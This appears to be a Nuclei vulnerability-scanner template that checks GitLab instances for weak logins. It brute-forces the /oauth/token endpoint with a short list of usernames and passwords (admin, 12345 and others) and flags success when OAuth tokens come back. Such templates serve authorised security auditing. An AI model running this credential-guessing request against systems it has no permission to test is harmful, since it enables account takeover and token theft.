id: gitlab-weak-login
info:
  author: Suman_Kar
  name: Gitlab Weak Login
  severity: high
  tags: gitlab,default-login
requests:
- attack: clusterbomb
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"access_token":'
    - '"token_type":'
    - '"refresh_token":'
  matchers-condition: and
  payloads:
    gitlab_password:
    - 12345
    - 123456789
    gitlab_user:
    - 1234
    - admin
  raw:
  - "POST /oauth/token HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh;\
    \ Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: application/json,\
    \ text/plain, */*\nAccept-Language: en-US,en;q=0.5\nReferer: {{BaseURL}}\ncontent-type:\
    \ application/json\nConnection: close\n\n{\"grant_type\":\"password\",\"username\"\
    :\"\xA7gitlab_user\xA7\",\"password\":\"\xA7gitlab_password\xA7\"}\n"
